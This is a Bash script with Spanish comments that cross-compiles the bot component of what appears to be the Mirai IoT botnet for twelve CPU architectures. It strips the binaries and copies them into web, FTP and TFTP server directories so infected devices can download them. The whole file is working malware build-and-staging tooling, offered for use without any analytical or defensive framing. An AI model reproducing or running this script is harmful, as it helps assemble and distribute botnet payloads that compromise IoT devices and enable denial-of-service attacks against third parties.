#!/bin/bash
# makebot.sh - Compila solo los bots (parte C) y copia los binarios a los directorios de descarga

# Exportar rutas de los cross-compilers (igual que en build.sh)
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/x86_64/bin

# Función de compilación estándar
function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -lpthread -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

# Función especial para armv7l (sin strip adicional)
function compile_bot_arm7 {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -lpthread -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
}

# Crear directorio de salida
mkdir -p release

echo "Compilando bots..."

# Debug (i586 con símbolos)
echo "  - debug (i586)"
compile_bot i586 debug.dbg "-static -DDEBUG"

# Arquitecturas
echo "  - x86"
compile_bot i586 main_x86 "-static"
echo "  - x86_64"
compile_bot x86_64 main_x86_64 "-static"
echo "  - mips"
compile_bot mips main_mips "-static"
echo "  - mipsel"
compile_bot mipsel main_mpsl "-static"
echo "  - armv4l"
compile_bot armv4l main_arm "-static"
echo "  - armv5l"
compile_bot armv5l main_arm5 "-static"
echo "  - armv6l"
compile_bot armv6l main_arm6 "-static"
echo "  - armv7l"
compile_bot_arm7 armv7l main_arm7 "-static"
echo "  - powerpc"
compile_bot powerpc main_ppc "-static"
echo "  - m68k"
compile_bot m68k main_m68k "-static"
echo "  - sh4"
compile_bot sh4 main_sh4 "-static"
echo "  - sparc"
compile_bot sparc main_spc "-static"

echo "Compilación terminada. Copiando binarios a los directorios de descarga..."

# Crear directorios destino si no existen
mkdir -p /var/www/html
mkdir -p /var/ftp
mkdir -p /var/lib/tftpboot

# Copiar todos los main_* y debug.dbg a los tres lugares
cp release/main_* /var/www/html/ 2>/dev/null
cp release/debug.dbg /var/www/html/ 2>/dev/null

cp release/main_* /var/ftp/ 2>/dev/null
cp release/debug.dbg /var/ftp/ 2>/dev/null

cp release/main_* /var/lib/tftpboot/ 2>/dev/null
cp release/debug.dbg /var/lib/tftpboot/ 2>/dev/null

echo "Listo. Los bots están disponibles en /var/www/html, /var/ftp y /var/lib/tftpboot."